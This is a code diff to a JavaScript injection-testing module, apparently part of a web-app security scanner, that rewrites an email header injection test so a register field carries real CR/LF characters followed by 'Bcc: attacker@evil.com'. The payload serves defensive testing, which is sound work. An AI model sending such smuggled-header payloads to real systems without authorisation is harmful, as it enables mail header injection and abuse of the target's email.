@@ -21,7 +21,6 @@ const NOSQL_PAYLOADS = [
 async function runInjection(ctx, cfg) {
   const auth = cfg.auth || {};
   ctx.emitEvent('module', { name: 'injection', label: 'Input & Injection' });
-  const startIdx = ctx.findings.length;
 
   const login = auth.login && buildCall(ctx, auth.login);
   const register = auth.register && buildCall(ctx, auth.register);
@@ -89,7 +88,8 @@ async function runInjection(ctx, cfg) {
   // 3) Email header injection (CRLF) di field register email.
   if (auth.register) {
     const call = buildCall(ctx, auth.register);
-    const res = await call({ '<USER>': "a\\r\\nBcc: attacker@evil.com@x.org", '<PASS>': 'pass1234!' });
+    const crlfEmail = 'a' + '\r\n' + 'Bcc: attacker@evil.com@x.org';
+    const res = await call({ '<USER>': crlfEmail, '<PASS>': 'pass1234!' });
     const hdrs = res.headers || {};
     if (hdrs['bcc']) {
       ctx.addFinding({
@@ -116,8 +116,6 @@ async function runInjection(ctx, cfg) {
       });
     }
   }
-
-  return ctx.findings.slice(startIdx);
 }
 
 module.exports = { runInjection };
